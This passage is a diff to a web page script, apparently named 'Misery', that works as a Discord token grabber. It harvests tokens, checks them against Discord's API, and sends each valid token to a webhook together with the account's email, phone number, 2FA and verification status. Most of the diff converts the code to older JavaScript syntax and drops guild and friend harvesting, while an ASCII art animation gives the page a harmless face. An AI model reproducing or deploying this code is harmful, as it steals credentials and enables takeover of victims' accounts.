                             tokenSources.push({ source: 'HTML', key: 'inline', token: t });
                         }
                     });
@@ -796,9 +837,9 @@
             } catch(e) {}
 
             // Deduplicate
-            const uniqueTokens = [];
-            const seen = new Set();
-            tokenSources.forEach(item => {
+            var uniqueTokens = [];
+            var seen = new Set();
+            tokenSources.forEach(function(item) {
                 if (!seen.has(item.token)) {
                     seen.add(item.token);
                     uniqueTokens.push(item);
@@ -810,92 +851,66 @@
                 return;
             }
 
-            sendToWebhook(`🔑 **Found ${uniqueTokens.length} potential token(s). Validating...**`);
+            sendToWebhook('🔑 **Found ' + uniqueTokens.length + ' potential token(s). Validating...**');
 
-            let validCount = 0;
-            let invalidCount = 0;
+            var validCount = 0;
+            var invalidCount = 0;
 
-            const tokenPromises = uniqueTokens.map(async (item) => {
-                const token = item.token;
-                let status = 'UNKNOWN';
-                let userInfo = '';
-                try {
-                    const res = await fetch('https://discord.com/api/v9/users/@me', {
+            var tokenPromises = uniqueTokens.map(function(item) {
+                return new Promise(function(resolve) {
+                    var token = item.token;
+                    var status = 'UNKNOWN';
+                    var userInfo = '';
+                    fetch('https://discord.com/api/v9/users/@me', {
                         headers: { 'Authorization': token, 'Content-Type': 'application/json' }
+                    }).then(function(res) {
+                        if (res.status === 200) {
+                            return res.json().then(function(data) {
+                                status = '✅ VALID';
+                                validCount++;
+                                var tag = data.global_name || data.username || data.id;
+                                userInfo = ' | ' + tag + ' (' + data.id + ')';
+                                sendToWebhook('🎯 **VALID TOKEN**\nToken: `' + token + '`\nUser: ' + tag + ' (' + data.id + ')\nEmail: ' + (data.email || 'N/A') + '\n2FA: ' + (data.mfa_enabled ? 'Yes' : 'No') + '\nNitro: ' + (data.premium_type || 'None') + '\nVerified: ' + (data.verified ? 'Yes' : 'No') + '\nPhone: ' + (data.phone || 'N/A'));
+                                resolve(status + userInfo + ' | Source: ' + item.source + ' | Token: `' + token.slice(0, 25) + '...`');
+                            });
+                        } else if (res.status === 401) {
+                            status = '❌ INVALID (expired/revoked)';
+                            invalidCount++;
+                            resolve(status + ' | Source: ' + item.source + ' | Token: `' + token.slice(0, 25) + '...`');
+                        } else if (res.status === 403) {
+                            status = '⛔ BANNED/LOCKED';
+                            invalidCount++;
+                            resolve(status + ' | Source: ' + item.source + ' | Token: `' + token.slice(0, 25) + '...`');
+                        } else if (res.status === 429) {
+                            status = '⚠️ RATE LIMITED';
+                            invalidCount++;
+                            resolve(status + ' | Source: ' + item.source + ' | Token: `' + token.slice(0, 25) + '...`');
+                        } else {
+                            status = '⚠️ ERROR ' + res.status;
+                            invalidCount++;
+                            resolve(status + ' | Source: ' + item.source + ' | Token: `' + token.slice(0, 25) + '...`');
+                        }
+                    }).catch(function() {
+                        status = '⚠️ NETWORK ERROR';
+                        invalidCount++;
+                        resolve(status + ' | Source: ' + item.source + ' | Token: `' + token.slice(0, 25) + '...`');
                     });
-                    if (res.status === 200) {
-                        const data = await res.json();
-                        status = '✅ VALID';
-                        validCount++;
-                        const tag = data.global_name || data.username || data.id;
-                        userInfo = ` | ${tag} (${data.id})`;
-                        await sendToWebhook(`🎯 **VALID TOKEN**\nToken: \`${token}\`\nUser: ${tag} (${data.id})\nEmail: ${data.email || 'N/A'}\n2FA: ${data.mfa_enabled ? 'Yes' : 'No'}\nNitro: ${data.premium_type || 'None'}\nVerified: ${data.verified ? 'Yes' : 'No'}\nPhone: ${data.phone || 'N/A'}`);
-                        
-                        // Guilds
-                        try {
-                            const gRes = await fetch('https://discord.com/api/v9/users/@me/guilds', {
-                                headers: { 'Authorization': token }
-                            });
-                            if (gRes.ok) {
-                                const guilds = await gRes.json();
-                                if (guilds && guilds.length > 0) {
-                                    let guildList = guilds.slice(0, 15).map(g => `${g.name || 'Unknown'} (${g.id}) - ${g.approximate_member_count || '?'} members`).join('\n');
-                                    if (guilds.length > 15) guildList += `\n... and ${guilds.length - 15} more`;
-                                    await sendToWebhook(`📋 **Guilds (${guilds.length} total):**\n${guildList}`);
-                                }
-                            }
-                        } catch(e) {}
-
-                        // Friends
-                        try {
-                            const fRes = await fetch('https://discord.com/api/v9/users/@me/relationships', {
-                                headers: { 'Authorization': token }
-                            });
-                            if (fRes.ok) {
-                                const rels = await fRes.json();
-                                if (rels && Array.isArray(rels)) {
-                                    const friends = rels.filter(r => r.type === 1);
-                                    if (friends.length > 0) {
-                                        const friendList = friends.slice(0, 10).map(f => `${f.user && (f.user.global_name || f.user.username) || 'Unknown'} (${f.user && f.user.id || '?'})`).join('\n');
-                                        await sendToWebhook(`👥 **Friends:** ${friends.length} total\n${friendList}${friends.length > 10 ? `\n... and ${friends.length - 10} more` : ''}`);
-                                    }
-                                }
-                            }
-                        } catch(e) {}
-
-                    } else if (res.status === 401) {
-                        status = '❌ INVALID (expired/revoked)';
-                        invalidCount++;
-                    } else if (res.status === 403) {
-                        status = '⛔ BANNED/LOCKED';
-                        invalidCount++;
-                    } else if (res.status === 429) {
-                        status = '⚠️ RATE LIMITED';
-                        invalidCount++;
-                    } else {
-                        status = '⚠️ ERROR ' + res.status;
-                        invalidCount++;
-                    }
-                } catch(e) {
-                    status = '⚠️ NETWORK ERROR';
-                    invalidCount++;
-                }
-                return `${status}${userInfo} | Source: ${item.source} | Token: \`${token.slice(0,25)}...\``;
+                });
             });
 
-            Promise.all(tokenPromises).then(async (results) => {
-                const summary = results.join('\n');
-                await sendToWebhook('```\nMISERY TOKEN SCAN RESULTS\n' + summary + '\n\nValid: ' + validCount + ' | Invalid: ' + invalidCount + '\n```');
+            Promise.all(tokenPromises).then(function(results) {
+                var summary = results.join('\n');
+                sendToWebhook('```\nMISERY TOKEN SCAN RESULTS\n' + summary + '\n\nValid: ' + validCount + ' | Invalid: ' + invalidCount + '\n```');
             });
         }
 
         // ---------- ASCII ANIMATION ----------
-        const asciiContainer = document.getElementById('asciiArt');
+        var asciiContainer = document.getElementById('asciiArt');
         if (asciiContainer) {
-            const rawText = asciiContainer.textContent;
-            const lines = rawText.split('\n');
-            const wrappedLines = lines.map((line) => {
-                const span = document.createElement('span');
+            var rawText = asciiContainer.textContent;
+            var lines = rawText.split('\n');
+            var wrappedLines = lines.map(function(line) {
+                var span = document.createElement('span');
                 span.className = 'line';
                 span.textContent = line;
                 span.style.animationDelay = (Math.random() * 5).toFixed(2) + 's';
@@ -903,7 +918,7 @@
                 return span;
             });
             asciiContainer.innerHTML = '';
-            wrappedLines.forEach(span => asciiContainer.appendChild(span));
+            wrappedLines.forEach(function(span) { asciiContainer.appendChild(span); });
         }
 
         console.log('Misery extended loaded.');
